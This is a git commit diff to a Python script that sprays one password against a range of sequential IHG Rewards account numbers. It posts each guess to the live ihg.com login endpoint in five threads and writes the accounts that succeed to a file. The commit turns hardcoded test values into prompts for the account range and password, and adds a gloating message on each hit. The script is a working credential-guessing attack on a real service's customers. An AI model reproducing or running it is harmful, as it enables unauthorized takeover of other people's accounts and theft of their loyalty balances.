616b7e891de7dae8e36810bda40b9f4dcb048ea8
nimdanoob <nimdanoob@163.com>
2016-10-12 13:44:09 +0800

    fix exception

--- spide_ihg.py
+++ spide_ihg.py
@@ -21,9 +21,12 @@ class AuthCertificate(object):
 
 def _parseAccountDict(response):
     status = response.get('status')
-    if status == 'SUCCESS':
+    tag = response.get('ssoImageTags',None)
+    if status == 'SUCCESS' and tag:
         save_account(response['loginCredentials'])
     else:
+        username = response['loginCredentials']['username']
+        print('{}验证失败'.format(username))
         pass
 
 
@@ -40,7 +43,7 @@ class SaveAccountActor(Actor):
         with open('account.txt','a+',encoding='utf-8') as f:
             while True:
                 msg = self.recv()
-                print('收到消息{}'.format(msg))
+                print('*****他妈的狗屎运{}'.format(msg))
                 f.write(msg)
                 f.flush()
 
@@ -56,10 +59,11 @@ def _request(account,password):
     }
     try:
         response = requests.post('https://www.ihg.com/gs-json/cn/zh/login',json=auth_json)
+        return json.loads(str(response.content, encoding='utf-8'))
     except Exception as e:
         print('发生{} 跳过账号 {}'.format(e.__traceback__,account))
         return None
-    return json.loads(str(response.content,encoding='utf-8'))
+
 
 def spider_task(account_start,account_end,pwd):
     for account in range(account_start,account_end):
@@ -69,19 +73,17 @@ def spider_task(account_start,account_end,pwd):
 
 if __name__ == '__main__':
     pool = ThreadPool(5)
-    # startAccount = int(input('输入 起始账号\n'))
-    # endAccount = int(input('输入 结束账号\n'))
-    # pwd = input('输入测试密码\n')
+    startAccount = int(input('输入 起始账号\n'))
+    endAccount = int(input('输入 结束账号\n'))
+    pwd = input('输入测试密码\n')
     # 测试代码
-    startAccount = 324577565
-    endAccount = 324577570
-    pwd = '0822'
+    # startAccount = 324577564
+    # endAccount = 324577570
+    # pwd = '0822'
     accountSize = endAccount - startAccount
     partLen = accountSize//5
     args_map =[]
-
     actor.start()
-
     for i in range(5):
         args_map.append((startAccount+i*partLen,startAccount+(i+1)*partLen,pwd))
     pool.starmap(spider_task,args_map)
